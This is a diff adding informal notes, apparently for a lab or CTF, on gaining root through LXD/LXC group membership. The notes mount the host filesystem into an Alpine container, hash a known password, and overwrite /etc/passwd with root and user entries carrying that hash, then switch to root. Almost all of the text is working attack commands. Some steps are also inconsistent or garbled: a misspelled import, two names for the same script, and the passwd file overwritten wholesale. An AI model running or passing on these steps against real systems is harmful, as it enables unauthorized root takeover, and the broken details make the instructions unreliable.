@@ -1,0 +1,46 @@
+lxd/lxc privilege escalation (search in exploit.db)
+
+lxd (linux container),lxc is are technologies related to containerizations in linux.
+
+in alpine container, mapping the target root with container /mnt/ directory
+
+---lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
+
+1.Git clone the https://github.com/saghul/lxd-alpine-builder
+
+
+2.To build alpine image. 
+  #sudo ./build_alpine
+
+3.use python import crypt and encrypt into sha512crypt.
+ #python
+ >>import cyrpt
+ >>crypt.crypt("plzsub")
+ $6$9ZWZtCqZWvTSFurQ$q1l80DewzBnRU5wGAbywZgaiLbSEET5w9wsTWGtVHDoBo4Dmdjc1bFcezqyIsd3ubY7FGdgokJ6.pMeJ2bKb91
+
+4.paste the commands from exploit.db in lxc_priv.sh and run the alpine image to get alpine container.
+  #./lxc.sh -f alpine-v3.19-x86_64-20240119_2245.tar.gz
+
+5.cd /mnt/root/etc
+
+6.use EOF and edit the passwd file
+  cat <<EOF> passwd
+  
+  EOF syntax is used only to create multi-line block text. write EOF to end the text.
+
+7.paste the sha512 code in root and john
+
+  root:\$6\$9ZWZtCqZWvTSFurQ\$q1l80DewzBnRU5wGAbywZgaiLbSEET5w9wsTWGtVHDoBo4Dmdjc1bFcezqyIsd3ubY7FGdgokJ6.pMeJ2bKb91:0:0:root:/root:/bin/ash
+
+  john:\$6\$9ZWZtCqZWvTSFurQ\$q1l80DewzBnRU5wGAbywZgaiLbSEET5w9wsTWGtVHDoBo4Dmdjc1bFcezqyIsd3ubY7FGdgokJ6.pMeJ2bKb91:1000:1000:john:/home/john:/bin/bash
+
+  ***Pls add \ in front of $ because bash script thinks that starts with $ is a variable and cannot take the words behind that $
+
+8.Read it again for sure and exit the container
+  #cat passwd
+  #exit
+
+9.Get the root user.
+  #su 
+  
+
